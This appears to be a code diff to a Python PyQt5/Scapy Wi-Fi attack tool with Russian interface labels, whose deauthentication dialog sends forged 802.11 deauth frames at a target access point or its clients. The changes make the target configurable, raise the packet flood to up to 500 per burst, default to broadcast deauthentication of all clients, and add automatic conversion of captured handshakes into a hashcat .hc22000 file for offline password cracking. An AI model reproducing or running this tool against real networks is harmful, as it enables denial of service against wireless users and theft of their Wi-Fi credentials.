@@ -3,7 +3,7 @@
 from PyQt5.QtWidgets import (
 	QApplication, QTreeView, QVBoxLayout, QHBoxLayout, QWidget, QHeaderView, QPushButton, QLabel, QProgressBar, 
 	QStyledItemDelegate, QStyleOptionProgressBar, QStyle, QComboBox, QSizePolicy, QMessageBox, QDialog, QTextEdit, QFileDialog,
-	QMainWindow, QTableView, QGroupBox, QFrame, QSpinBox
+	QMainWindow, QTableView, QGroupBox, QFrame, QSpinBox, QCheckBox
 )
 from PyQt5.QtGui import QStandardItemModel, QStandardItem, QIcon, QPainter, QColor, QPen, QPainterPath, QFont
 from PyQt5.QtCore import Qt, QEvent, QSize, QTimer, QObject, QMetaObject, Q_ARG, pyqtSlot
@@ -15,6 +15,7 @@ import subprocess
 import signal
 import json
 import pcapy
+import shutil
 
 from scapy.all import *
 
@@ -68,7 +69,7 @@ class ProgressBarDelegate(QStyledItemDelegate):
 		return None
 
 class DeauthDialog(QDialog):
-	def __init__(self, parent=None):
+	def __init__(self, interface, bssid, channel, parent=None):
 		super().__init__(parent)
 		
 		self.interrupt_flag = False
@@ -94,6 +95,12 @@ class DeauthDialog(QDialog):
 			34: "Deauthenticated because of 802.1X authentication failed"
 		}
 		
+		
+		self.interface = interface
+		self.bssid = bssid.lower()
+		self.BSSID = self.bssid.upper()
+		self.channel = channel
+	
 		self.stations = {}
 		self.ouiDB = {}
 		self.ouiCSV_Data = None
@@ -146,8 +153,8 @@ class DeauthDialog(QDialog):
 		settings_layout.setContentsMargins(5, 5, 5, 5)
 		
 		self.deauth_packets_edit = QSpinBox()
-		self.deauth_packets_edit.setRange(1, 100)
-		self.deauth_packets_edit.setValue(10)
+		self.deauth_packets_edit.setRange(1, 500)
+		self.deauth_packets_edit.setValue(127)
 		deauth_packets_edit_row = QHBoxLayout()
 		deauth_packets_edit_row.addWidget(QLabel('Пакетов деавторизации за раз'))
 		deauth_packets_edit_row.addWidget(self.deauth_packets_edit)
@@ -184,10 +191,17 @@ class DeauthDialog(QDialog):
 		deauth_timeout_edit_row.addWidget(QLabel('сек'))
 		deauth_timeout_edit_row.addStretch()
 		
+		self.hc22000_create_checkbox = QCheckBox('Создать .hc22000 файл для hashcat (требуется hcxpcapngtool)')
+		if not shutil.which('hcxpcapngtool'):
+			self.hc22000_create_checkbox.setEnabled(False)
+		else:
+			self.hc22000_create_checkbox.setChecked(Qt.Checked)
+		
 		settings_layout.addLayout(deauth_packets_edit_row)
 		settings_layout.addLayout(deauth_attempts_edit_row)
 		settings_layout.addLayout(deauth_reason_combo_row)
 		settings_layout.addLayout(deauth_timeout_edit_row)
+		settings_layout.addWidget(self.hc22000_create_checkbox)
 		
 		frame_in_layout = QHBoxLayout()
 		frame_in_layout.addLayout(status_layout, 1)
@@ -269,11 +283,6 @@ class DeauthDialog(QDialog):
 		main_layout.setContentsMargins(0, 0, 0, 0)
 		self.setLayout(main_layout)
 		
-		self.interface = 'radio0mon'
-		self.bssid = '04:5e:a4:6a:28:47'.lower()
-		self.BSSID = self.bssid.upper()
-		self.channel = 11
-
 		self.set_label_item_val_text(self.interface_label, 'Interface', self.interface)
 		self.set_label_item_val_text(self.bssid_label, 'Target', self.get_mac_vendor_mixed(self.bssid))
 		self.set_label_item_val_text(self.ch_label, 'Channel', self.channel)
@@ -282,12 +291,17 @@ class DeauthDialog(QDialog):
 		self.beacons = 0
 		signal.signal(signal.SIGINT, self.handle_interrupt)
 		self.log_add(f"[+] Switching {self.interface} to channel {self.channel}")
-	
+			
 	def start_deauth(self):
 		selected_indexes = self.stations_table.selectionModel().selectedRows()
-		row = selected_indexes[0].row()
-		model = self.stations_table.model()
-		self.client = model.data(model.index(row, 0), Qt.UserRole)
+		if selected_indexes:
+			row = selected_indexes[0].row()
+			model = self.stations_table.model()
+			self.client = model.data(model.index(row, 0), Qt.UserRole)
+			self.CLIENT = self.client.upper()
+		else:
+			self.client = 'ff:ff:ff:ff:ff:ff'
+			self.CLIENT = self.client.upper()
 		threading.Thread(target=self.send_deauth).start()
 		
 	def save_pcap(self):
@@ -299,6 +313,9 @@ class DeauthDialog(QDialog):
 			if file_path:
 				try:
 					wrpcap(file_path, self.packets)
+					if self.hc22000_create_checkbox.isChecked():
+						directory = os.path.dirname(file_path)
+						subprocess.run(['hcxpcapngtool', '-o', f"{directory}/{self.ssid}.hc22000", file_path], capture_output=True, text=True)
 				except Exception as e:
 					print(e)
 		else:
@@ -329,7 +346,7 @@ class DeauthDialog(QDialog):
 		if mac:
 			vendor = self.get_mac_vendor(mac)
 			if vendor != 'Unknown':
-				return f"{vendor[:9].replace(' ', '')}_{mac[9:].upper()}"
+				return f"{vendor[:9].replace(' ', '').replace(',', '').replace('.', '')}_{mac[9:].upper()}"
 			else:
 				return mac.upper()
 		else:
@@ -530,22 +547,24 @@ class DeauthDialog(QDialog):
 	def send_deauth(self):
 		self.btn_deauth.setEnabled(False)
 		pcap = pcapy.open_live(self.interface, 100, 1, 9)
-		for i in range(self.deauth_count):
-			
+		reason_index = self.deauth_reason_combo.currentIndex()
+		reason_code = self.deauth_reason_combo.itemData(reason_index) 
+		deauth_attempts = self.deauth_attempts_edit.value()
+
+		for i in range(deauth_attempts):
 			if self.client != 'ff:ff:ff:ff:ff:ff':
-				self.safe_log_add(f"[+] Send deauth to {self.BSSID} as {self.CLIENT} ({i +1} / {self.deauth_count})")
+				self.safe_log_add(f"[+] Send deauth to {self.BSSID} as {self.CLIENT} ({i +1} / {deauth_attempts}) (reason={reason_code})")
 			else:
-				self.safe_log_add(f"[+] Send deauth to broadcast as {self.BSSID} ({i +1} / {self.deauth_count})")
-				
-			self.current_deauth = i
-			for pnt_num in range(127):
-				deauth_pkt = bytes(RadioTap() / Dot11(addr1=self.client, addr2=self.bssid, addr3=self.bssid, SC=(pnt_num << 4)) / Dot11Deauth(reason=7))
+				self.safe_log_add(f"[+] Send deauth to broadcast as {self.BSSID} ({i +1} / {deauth_attempts}) (reason={reason_code})")
+			
+			for pnt_num in range(self.deauth_packets_edit.value()):
+				deauth_pkt = bytes(RadioTap() / Dot11(addr1=self.client, addr2=self.bssid, addr3=self.bssid, SC=(pnt_num << 4)) / Dot11Deauth(reason=reason_code))
 				pcap.sendpacket(deauth_pkt)
 			time.sleep(1)
 		self.btn_deauth.setEnabled(True)
 		
-if __name__ == '__main__':
-	app = QApplication(sys.argv)
-	window = DeauthDialog()
-	window.show()
-	sys.exit(app.exec_())
+#if __name__ == '__main__':
+#	app = QApplication(sys.argv)
+#	window = DeauthDialog('', '', '')
+#	window.show()
+#	sys.exit(app.exec_())
